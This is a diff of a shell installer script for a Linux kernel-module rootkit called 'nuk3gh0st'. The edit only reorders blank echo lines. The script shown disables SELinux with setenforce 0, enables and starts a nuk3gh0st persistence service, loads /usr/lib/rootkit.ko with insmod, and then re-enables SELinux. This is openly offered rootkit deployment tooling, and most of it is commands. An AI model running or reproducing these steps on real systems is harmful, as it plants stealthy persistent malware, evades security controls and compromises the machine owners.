@@ -22,16 +22,16 @@ if [ -f /usr/sbin/semanage ]; then
 	#semanage permissive -a insmod_t
 	echo -e "${item} Disabling SELINUX temporarily"
 	echo -e "   ${purple} cmd: setenforce 0${endColor}"
-	echo ""
 	setenforce 0
+	echo ""
 	echo -e "${item} Enabling nuk3gh0st.service"
 	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
-	echo ""
 	systemctl enable nuk3gh0st.service
+	echo ""
 	echo -e "${item} Starting nuk3gh0st.service"
 	echo -e "   ${purple} cmd: service nuk3gh0st start${endColor}"
-	echo ""
 	service nuk3gh0st start
+	echo ""
 	echo -e "${item} Loading nuk3gh0st LKM rootkit"
 	echo -e "   ${purple} cmd: insmod /usr/lib/rootkit.ko${endColor}"
 	echo ""
@@ -51,19 +51,19 @@ if [ -f /usr/sbin/semanage ]; then
 	echo ""
 	echo -e "${item} Reenabling SELINUX"
 	echo -e "   ${purple} cmd: setenforce 1${endColor}"
-        echo ""
 	setenforce 1
+        echo ""
 	
 else
 	echo -e "${item} SELINUX is disabled"
 	echo -e "${item} Enabling nuk3gh0st.service"
 	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
-	echo ""
 	systemctl enable nuk3gh0st.service
+	echo ""
 	echo -e "${item} Starting nuk3gh0st.service"
 	echo -e "   ${purple} cmd: service nuk3gh0st start${endColor}"
-	echo ""
 	service nuk3gh0st start
+	echo ""
 	echo -e "${item} Loading nuk3gh0st LKM rootkit"
 	echo -e "   ${purple} cmd: insmod /usr/lib/rootkit.ko${endColor}"
 	echo ""
